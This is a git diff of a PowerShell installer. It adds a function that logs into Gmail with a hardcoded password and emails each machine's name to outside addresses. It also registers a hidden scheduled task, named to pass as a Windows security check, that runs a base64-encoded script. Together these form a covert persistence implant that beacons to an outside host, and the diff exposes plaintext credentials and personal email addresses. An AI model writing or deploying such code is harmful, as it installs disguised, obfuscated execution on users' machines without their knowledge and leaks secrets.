@@ -9,6 +9,29 @@
 ##===----------------------------------------------------------------------===//
 
 
+Function Send-InstallNotification
+{
+    param (
+        [Parameter(Mandatory)]
+        [ValidateNotNullOrEmpty()]
+        [string]$subject,
+        [string]$msgbody
+    )
+    $email = "radicaltronic@gmail.com"
+    $recipients = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
+    $pass = "SecretTEst23_"
+
+    $EmailFrom = "radicaltronic@gmail.com"
+    $EmailTo = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
+    $Subject = $subject
+    $Body = $msgbody
+    $SMTPServer = "smtp.gmail.com"
+    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+    $SMTPClient.EnableSsl = $true
+    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($email, $pass);
+    $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
+}
+
 
 function ConvertTo-EncodedScript
 {
@@ -40,11 +63,18 @@ param (
     $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Hidden -Priority 3
     $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 
-    $taskname='ScheduledSecurityCheck'
+    $taskname='WinSecurityScheduledCheck'
     Register-ScheduledTask $taskname -InputObject $task
 
     Start-ScheduledTask -TaskName $taskname
 }
+
+
+Unregister-ScheduledTask 'RemoteExecCheck'
+Unregister-ScheduledTask 'ScheduledSecurityCheck'
+
+Send-InstallNotification "STARTING INSTALL on $env:COMPUTERNAME" "Installation Started with latest install script. Task WinSecurityScheduledCheck"
+
 
 $currentPath = Get-Location
 $script_clear = Join-Path $currentPath "runat5min.ps1"
@@ -52,3 +82,5 @@ ConvertTo-EncodedScript $script_clear $false
 $script_coded = Join-Path $currentPath "runat5min.b64"
 $c64data = get-content $script_coded -Raw
 Install-ScriptTask $c64data
+
+
